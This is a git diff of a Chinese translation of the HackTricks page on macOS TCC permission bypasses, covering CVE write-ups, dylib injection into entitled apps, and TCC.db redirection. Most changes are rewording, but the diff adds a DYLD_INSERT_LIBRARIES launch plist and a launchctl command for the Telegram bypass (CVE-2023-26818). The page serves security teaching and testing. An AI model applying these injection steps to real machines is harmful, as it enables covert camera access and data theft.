@@ -2,12 +2,12 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -16,7 +16,7 @@
 
 ### 写入绕过
 
-这不是一个绕过，这只是TCC的工作原理：**它不会阻止写入**。如果终端**无法读取用户的桌面，它仍然可以写入其中**：
+这不是一个绕过，这只是TCC的工作原理：**它不会阻止写入**。如果终端**没有读取用户桌面的访问权限，它仍然可以写入其中**：
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -44,7 +44,7 @@ asd
 
 ### 处理扩展名 - CVE-2022-26767
 
-文件被赋予属性 **`com.apple.macl`**，以使某个应用程序具有读取权限。当用户通过 **拖放** 文件到应用程序上或者双击文件以使用 **默认应用程序** 打开时，将设置此属性。
+文件被赋予属性 **`com.apple.macl`**，以使某个应用程序具有读取它的权限。当用户通过 **拖放** 文件到应用程序上，或者双击文件以使用 **默认应用程序** 打开它时，将设置此属性。
 
 因此，用户可以 **注册一个恶意应用程序** 来处理所有扩展名，并调用 Launch Services 来 **打开** 任何文件（因此，恶意文件将被授予读取权限）。
 
@@ -54,7 +54,7 @@ asd
 
 **iMovie** 和 **Garageband** 具有此权限以及其他权限。
 
-有关从该权限中获取 iCloud 令牌的漏洞的更多 **信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+有关从该权限中获取 iCloud 令牌的漏洞的更多 **信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
@@ -181,7 +181,7 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源的访问，路径为`$HOME/Library/Application Support/com.apple.TCC/TCC.db`。因此，如果用户成功使用指向不同文件夹的`$HOME`环境变量重新启动TCC，用户可以在`/Library/Application Support/com.apple.TCC/TCC.db`中创建一个新的TCC数据库，并欺骗TCC授予任何应用程序任何TCC权限。
 
 {% hint style="success" %}
-请注意，Apple使用存储在用户配置文件中的`NFSHomeDirectory`属性中的设置作为`$HOME`的值，因此，如果您以具有修改此值权限（`kTCCServiceSystemPolicySysAdminFiles`）的应用程序，您可以使用TCC绕过来利用此选项。
+请注意，Apple使用存储在用户配置文件中的`NFSHomeDirectory`属性中的设置作为`$HOME`的值，因此，如果您以具有修改此值权限（`kTCCServiceSystemPolicySysAdminFiles`）的应用程序权限，您可以使用TCC绕过此选项。
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -194,12 +194,12 @@ TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源�
 
 1. 获取目标应用程序的_csreq_ blob。
 2. 使用所需访问权限和_csreq_ blob植入一个伪造的_TCC.db_文件。
-3. 使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)导出用户的Directory Services条目。
-4. 修改Directory Services条目以更改用户的主目录。
-5. 使用[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)导入修改后的Directory Services条目。
+3. 使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)导出用户的目录服务条目。
+4. 修改目录服务条目以更改用户的主目录。
+5. 使用[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)导入修改后的目录服务条目。
 6. 停止用户的_tccd_并重新启动该进程。
 
-第二个POC使用了`/usr/libexec/configd`，其中包含具有值`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`。如果使用`-t`选项运行`configd`，攻击者可以指定要加载的自定义Bundle。因此，该漏洞利用了`configd`代码注入来替换更改用户主目录的`dsexport`和`dsimport`方法。
+第二个POC使用了`/usr/libexec/configd`，其中包含具有值`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`。如果使用`-t`选项运行`configd`，攻击者可以指定要加载的自定义Bundle。因此，该漏洞利用了`configd`代码注入，以替换更改用户主目录的`dsexport`和`dsimport`方法。
 
 有关更多信息，请查看[原始报告](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。
 
@@ -211,7 +211,7 @@ TCC使用位于用户HOME文件夹中的数据库来控制对用户特定资源�
 [macos-proces-abuse](../../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-此外，绕过TCC最常见的进程注入方式是通过插件（加载库）进行的。插件通常以库或plist的形式存在，将由主应用程序加载并在其上下文中执行。因此，如果主应用程序具有对TCC受限文件的访问权限（通过授予权限或权限），则自定义代码也将具有相同的访问权限。
+此外，绕过TCC最常见的进程注入方式是通过插件（加载库）进行的。插件通常以库或plist的形式存在，它们将由主应用程序加载并在其上下文中执行。因此，如果主应用程序具有对TCC受限文件的访问权限（通过授予权限或权限），则自定义代码也将具有相同的访问权限。
 
 ### CVE-2020-27937 - Directory Utility
 
@@ -264,7 +264,7 @@ exit(0);
 
 ### Firefox
 
-Firefox应用程序仍然存在漏洞，具有`com.apple.security.cs.disable-library-validation`权限：
+Firefox应用程序具有`com.apple.security.cs.disable-library-validation`和`com.apple.security.cs.allow-dyld-environment-variables`权限：
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -276,6 +276,8 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 <key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
 <true/>
 <key>com.apple.security.device.audio-input</key>
 <true/>
@@ -296,17 +298,47 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 
 ### CVE-2023-26818 - Telegram
 
-Telegram具有权限`com.apple.security.cs.allow-dyld-environment-variables`和`com.apple.security.cs.disable-library-validation`，因此可以滥用它以获取其权限，例如使用摄像头进行录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。
+Telegram具有权限**`com.apple.security.cs.allow-dyld-environment-variables`**和**`com.apple.security.cs.disable-library-validation`**，因此可以滥用它来**获取其权限**，例如使用摄像头进行录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。
 
+请注意，如何使用环境变量加载库，创建了一个**自定义plist**来注入此库，并使用**`launchctl`**来启动它：
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.telegram.launcher</string>
+<key>RunAtLoad</key>
+<true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/tmp/telegram.dylib</string>
+</dict>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
+</array>
+<key>StandardOutPath</key>
+<string>/tmp/telegram.log</string>
+<key>StandardErrorPath</key>
+<string>/tmp/telegram.log</string>
+</dict>
+</plist>
+```
+
+```bash
+launchctl load com.telegram.launcher.plist
+```
 ## 通过打开调用
 
-即使在沙盒环境中，也可以调用**`open`**。
+即使在沙盒环境下，也可以调用**`open`**。
 
 ### 终端脚本
 
-通常会为终端授予**完全磁盘访问权限（FDA）**，至少在技术人员使用的计算机上是如此。可以使用它来调用**`.terminal`**脚本。
+通常情况下，给终端授予**完全磁盘访问权限（FDA）**是很常见的，至少在技术人员使用的计算机上是如此。可以使用它来调用**`.terminal`**脚本。
 
-**`.terminal`**脚本是plist文件，其中包含要在**`CommandString`**键中执行的命令：
+**`.terminal`**脚本是plist文件，例如下面这个文件中的命令在**`CommandString`**键中执行：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -364,9 +396,11 @@ ls /tmp/snap/Users/admin_user # This will work
 
 更详细的解释可以在[原始报告中找到](https://theevilbit.github.io/posts/cve\_2020\_9771/)。
 
-### CVE-2021-1784和CVE-2021-30808 - 在TCC文件上进行挂载
+### CVE-2021-1784和CVE-2021-30808 - 在TCC文件上挂载
 
-即使TCC DB文件受到保护，仍然可以通过**挂载到目录上**一个新的TCC.db文件：
+即使TCC DB文件受到保护，仍然可以在目录上**挂载一个新的TCC.db文件**：
+
+{% code overflow="wrap" %}
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
